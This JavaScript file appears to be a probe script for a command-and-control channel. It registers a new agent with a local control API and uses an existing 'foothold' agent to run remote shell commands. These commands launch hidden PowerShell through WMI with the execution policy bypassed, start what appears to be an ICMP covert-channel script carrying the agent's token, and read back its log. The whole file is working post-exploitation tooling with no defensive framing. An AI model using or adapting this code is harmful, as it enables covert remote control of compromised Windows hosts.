const API = 'http://127.0.0.1:8971';
const FOOTHOLD = process.argv[2];
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function j(path, body) {
  const r = await fetch(API + path, body ? { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) } : undefined);
  return r.json();
}
async function waitTask(agentId, taskId, s = 40) {
  for (let i = 0; i < s / 2; i++) {
    await sleep(2000);
    const { tasks } = await j('/api/channel/tasks?agent=' + agentId);
    const x = (tasks || []).find((y) => y.taskId === taskId);
    if (x && x.status === 'resulted') return x.resultPreview;
  }
  return null;
}
const reg = await j('/api/channel/agent', { action: 'register', label: 'listen5-probe' });
console.log('identity:', reg.agentId);
await j('/api/channel/task', { agentId: reg.agentId, kind: 'note', data: 'l2c-nonempty' });
const wmi = "powershell -NoProfile -Command $r=Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\System32\agentbox\guest-icmp-l2b.ps1 -AgentId " + reg.agentId + " -Token " + reg.token + " -LogPath C:\Windows\Temp\icmp-l2c.log'}; $r.ReturnValue";
const lt = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: wmi });
console.log('launch:', await waitTask(FOOTHOLD, lt.taskId, 30));
await sleep(22000);
const t2 = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: 'type C:\Windows\Temp\icmp-l2c.log' });
console.log('L2C LOG:', JSON.stringify(await waitTask(FOOTHOLD, t2.taskId, 40)));
